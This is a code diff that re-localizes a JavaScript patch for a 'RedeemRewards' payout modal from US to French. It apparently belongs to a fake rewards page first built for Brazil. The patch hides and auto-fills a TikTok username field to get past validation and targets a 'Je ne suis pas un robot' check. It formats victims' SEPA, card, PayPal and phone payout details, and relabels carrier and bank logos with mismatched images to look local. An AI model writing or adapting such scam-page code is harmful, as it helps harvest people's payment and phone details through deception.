@@ -1,13 +1,13 @@
-// Runtime patch for the RedeemRewards modal (US localization):
+// Runtime patch for the RedeemRewards modal (French localization):
 // - Hide the "@yourusername" TikTok field and auto-fill it so validation passes
 // - Apply light input formatting for the payout key field based on selected method:
-//     Cash App  -> ensure leading "$" (cashtag)
+//     Virement SEPA / Cash App legacy key -> keep compatible formatting
 //     PayPal    -> lowercase, trim spaces (email)
 //     Venmo     -> ensure leading "@" (handle)
-//     Zelle     -> US phone mask (555) 555-5555 when numeric, otherwise pass-through email
+//     Virement instantané / Zelle legacy key -> phone/email formatting
 (function () {
-  if (window.__redeemPatchVersion === 13) return;
-  window.__redeemPatchVersion = 13;
+  if (window.__redeemPatchVersion === 16) return;
+  window.__redeemPatchVersion = 16;
   window.__redeemPatchInstalled = true;
 
   const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
@@ -52,7 +52,8 @@
 
   function findCaptchaVerifyButton(target) {
     const button = document.querySelector('button[aria-label="Verify"]');
-    if (!button || !document.body || !document.body.innerText.includes("I am not a robot")) return null;
+    const pageText = document.body?.innerText || "";
+    if (!button || !document.body || (!pageText.includes("I am not a robot") && !pageText.includes("Je ne suis pas un robot"))) return null;
     if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return null;
     const card = button.parentElement && button.parentElement.parentElement;
     if (target === button || button.contains(target) || (card && card.contains(target))) return button;
@@ -203,27 +204,27 @@
       );
     });
     const text = (selected?.textContent || "").trim().toLowerCase();
-    if (text === "cash app") return "cashapp";
-    if (text === "venmo") return "venmo";
+    if (text === "cash app" || text === "virement sepa") return "cashapp";
+    if (text === "venmo" || text === "carte bancaire") return "venmo";
     if (text === "paypal") return "paypal";
-    if (text === "zelle") return "zelle";
+    if (text === "zelle" || text === "virement instantané") return "zelle";
     return null;
   }
 
   function detectKeyType(input) {
     const ph = (input.getAttribute("placeholder") || "").toLowerCase();
-    if (ph.includes("cashtag") || ph.startsWith("$")) return "cashapp";
+    if (ph.includes("cashtag") || ph.includes("sepa") || ph.startsWith("$")) return "cashapp";
     if (ph.includes("paypal") || ph.includes("@paypal") || ph.includes("email")) return "paypal";
-    if (ph.includes("venmo") || ph.startsWith("@your-venmo")) return "venmo";
-    if (ph.includes("555-5555") || ph.includes("email or (")) return "zelle";
+    if (ph.includes("venmo") || ph.includes("carte") || ph.startsWith("@your-venmo")) return "venmo";
+    if (ph.includes("555-5555") || ph.includes("email or (") || ph.includes("virement instantané")) return "zelle";
     const wrapperText = (input.closest("div")?.parentElement?.textContent || "").toLowerCase();
-    if (wrapperText.includes("payment details") || wrapperText.includes("payout")) return selectedKeyTypeFromButtons();
+    if (wrapperText.includes("payment details") || wrapperText.includes("détails du paiement") || wrapperText.includes("payout") || wrapperText.includes("paiement")) return selectedKeyTypeFromButtons();
     return null;
   }
 
   function formatByType(value, type) {
     if (type === "cashapp") return maskCashtag(value);
-    if (type === "paypal") return maskE-mail(value);
+    if (type === "paypal") return maskEmail(value);
     if (type === "venmo") return maskVenmo(value);
     if (type === "zelle") return maskZelle(value);
     return value;
@@ -273,14 +274,14 @@
     document.querySelectorAll("body *").forEach((element) => {
       if (element.children.length) return;
       const text = (element.textContent || "").trim();
-      if (text === "+55") element.textContent = "+1";
-      if (text === "12345678901") element.textContent = "(202) 555-0123";
+      if (["+55", "+1"].includes(text)) element.textContent = "+33";
+      if (text === "12345678901" || text === "(202) 555-0123") element.textContent = "06 12 34 56 78";
     });
 
     const carrierLogos = [
-      { alt: "Claro", name: "Verizon", src: "/assets/verizon-logo.png" },
-      { alt: "TIM", name: "AT&T", src: "/assets/att-logo.png" },
-      { alt: "Vivo", name: "T-Mobile", src: "/assets/tmobile-logo.png" },
+      { alt: "Claro", name: "Orange", src: "/assets/claro-logo-A9e4ycmK.png" },
+      { alt: "TIM", name: "SFR", src: "/assets/tmobile-logo.png" },
+      { alt: "Vivo", name: "Bouygues Telecom", src: "/assets/verizon-logo.png" },
     ];
 
     carrierLogos.forEach(({ alt, name, src }) => {
@@ -292,28 +293,28 @@
 
     document.querySelectorAll('img[src*="pagbank-logo"]').forEach((image) => {
       image.src = "/assets/ach-logo.png";
-      image.alt = "ACH bank transfer";
+      image.alt = "Virement bancaire SEPA";
     });
 
-    const instantTransferLogo = document.querySelector('img[alt="Instant Transfer"]');
+    const instantTransferLogo = document.querySelector('img[alt="Instant Transfer"], img[alt="Virement instantané"]');
     const payoutLogoRow = instantTransferLogo?.parentElement;
     if (payoutLogoRow && payoutLogoRow.dataset.usPayoutLogos !== "1") {
       payoutLogoRow.dataset.usPayoutLogos = "1";
       payoutLogoRow.replaceChildren();
       const label = document.createElement("span");
-      label.classNom = "text-muted-foreground text-[12px] whitespace-nowrap mr-1";
-      label.textContent = "Virement bancaire (ACH) /";
+      label.className = "text-muted-foreground text-[12px] whitespace-nowrap mr-1";
+      label.textContent = "Virement bancaire (SEPA) /";
       payoutLogoRow.appendChild(label);
       [
-        ["/assets/cashapp-logo.png", "Cash App"],
+        ["/assets/ach-logo.png", "Virement SEPA"],
         ["/assets/paypal-logo-CXd97tl4.png", "PayPal"],
-        ["/assets/venmo-logo.png", "Venmo"],
-        ["/assets/zelle-logo.png", "Zelle"],
+        ["/assets/venmo-logo.png", "Carte bancaire"],
+        ["/assets/zelle-logo.png", "Virement instantané"],
       ].forEach(([src, alt]) => {
         const image = document.createElement("img");
         image.src = src;
         image.alt = alt;
-        image.classNom = "h-[18px] max-w-[34px] object-contain";
+        image.className = "h-[18px] max-w-[34px] object-contain";
         payoutLogoRow.appendChild(image);
       });
     }
